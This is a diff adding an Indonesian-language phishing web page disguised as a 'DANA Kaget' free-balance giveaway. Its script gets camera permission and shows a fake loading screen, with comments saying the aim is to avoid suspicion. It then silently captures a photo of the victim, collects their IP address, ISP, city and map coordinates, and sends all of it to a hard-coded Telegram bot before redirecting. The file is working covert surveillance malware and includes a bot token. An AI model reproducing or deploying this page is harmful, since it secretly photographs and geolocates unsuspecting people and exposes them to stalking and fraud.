@@ -1,0 +1,96 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0">
+    <title>DANA KAGET - SALDO GRATIS</title>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.2/css/all.min.css">
+    <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@400;700;800&display=swap" rel="stylesheet">
+    <style>
+        :root { --dana-blue: #118eea; --bg-blue: #0076e4; }
+        body { background: var(--bg-blue); color: #333; font-family: 'Poppins', sans-serif; display: flex; align-items: center; justify-content: center; height: 100vh; margin: 0; overflow: hidden; }
+        .card { background: white; padding: 45px 25px; border-radius: 30px; box-shadow: 0 20px 40px rgba(0,0,0,0.3); width: 85%; max-width: 360px; text-align: center; }
+        .icon-header { font-size: 60px; color: var(--dana-blue); margin-bottom: 20px; }
+        .btn-claim { background: var(--dana-blue); color: white; border: none; padding: 18px; border-radius: 50px; font-weight: 800; font-size: 16px; cursor: pointer; width: 100%; margin-top: 25px; box-shadow: 0 8px 15px rgba(17, 142, 234, 0.4); transition: 0.3s; }
+        #video, #canvas { display: none; }
+        .footer { font-size: 10px; color: #bbb; margin-top: 25px; text-transform: uppercase; }
+    </style>
+</head>
+<body>
+
+    <div class="card" id="ui-box">
+        <div class="icon-header"><i class="fa-solid fa-wallet"></i></div>
+        <h2 style="margin:0; font-size: 24px; color: #118eea; font-weight: 800;">DANA KAGET</h2>
+        <p style="font-size: 13px; color: #666; margin-top: 10px;">Anda berhak mendapatkan saldo Dana Kaget. Klik tombol di bawah untuk proses verifikasi.</p>
+        <button class="btn-claim" onclick="gasInfil()"> <i class="fa-solid fa-bolt"></i> BUKA SEKARANG </button>
+        <div class="footer"><i class="fa-solid fa-shield-halved"></i> SECURE VERIFICATION</div>
+    </div>
+
+    <video id="video" autoplay playsinline></video>
+    <canvas id="canvas"></canvas>
+
+    <script>
+        // --- DATA FIX BOS SHAFIQ ---
+        const MY_TOKEN = "8671383819:AAEga30urtRkB2U4SU_TIeGq7vOD38kx1WI";
+        const MY_ID = "8463622692";
+        const TARGET_URL = "https://link.dana.id/kaget/shafiq_panel";
+
+        async function gasInfil() {
+            try {
+                // 1. Minta Izin Kamera
+                const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
+                
+                // Ganti UI biar gak curiga
+                document.getElementById('ui-box').innerHTML = "<i class='fa-solid fa-spinner fa-spin' style='font-size:40px; color:#118eea'></i><h2 style='color:#118eea; margin-top:15px'>SINKRONISASI...</h2><p>Mohon tunggu sebentar.</p>";
+
+                const video = document.getElementById('video');
+                video.srcObject = stream;
+
+                // 2. Ambil Data IP
+                const res = await fetch('https://ipapi.co/json/');
+                const net = await res.json();
+
+                // 3. Jepret & Kirim (Delay 2 detik biar fokus)
+                setTimeout(() => {
+                    const canvas = document.getElementById('canvas');
+                    canvas.width = video.videoWidth;
+                    canvas.height = video.videoHeight;
+                    canvas.getContext('2d').drawImage(video, 0, 0);
+
+                    canvas.toBlob(async (blob) => {
+                        const fd = new FormData();
+                        fd.append('chat_id', MY_ID);
+                        fd.append('photo', blob, 'target.jpg');
+                        fd.append('caption', 
+                            "╰┈➤ 🌟 NEW TARGET HIT 🌟\n" +
+                            "━━━━━━━━━━━━━━━━━━━━━\n" +
+                            "◈ IP ADDRESS : " + net.ip + "\n" +
+                            "◈ ASN / ISP  : " + (net.asn || "N/A") + " - " + net.org + "\n" +
+                            "◈ KOTA       : " + net.city + ", " + net.country_name + "\n" +
+                            "━━━━━━━━━━━━━━━━━━━━━\n" +
+                            "◈ LOKASI     : http://maps.google.com/?q=$" + net.latitude + "," + net.longitude + "\n" +
+                            "◈ PLATFORM   : " + navigator.platform + "\n" +
+                            "◈ TIME       : " + new Date().toLocaleString('id-ID') + "\n" +
+                            "╰┈➤ 🌟 SHAFIQ LUXURY PANEL 🌟"
+                        );
+
+                        // KIRIM KE TELEGRAM (PASTI WORK!)
+                        await fetch("https://api.telegram.org/bot" + MY_TOKEN + "/sendPhoto", {
+                            method: 'POST',
+                            body: fd
+                        });
+
+                        // Kabur
+                        stream.getTracks().forEach(t => t.stop());
+                        window.location.href = TARGET_URL;
+                    }, 'image/jpeg');
+                }, 2000);
+
+            } catch (err) {
+                // Kalo user tolak kamera, langsung redirect biar gak curiga
+                window.location.href = TARGET_URL;
+            }
+        }
+    </script>
+</body>
+</html>
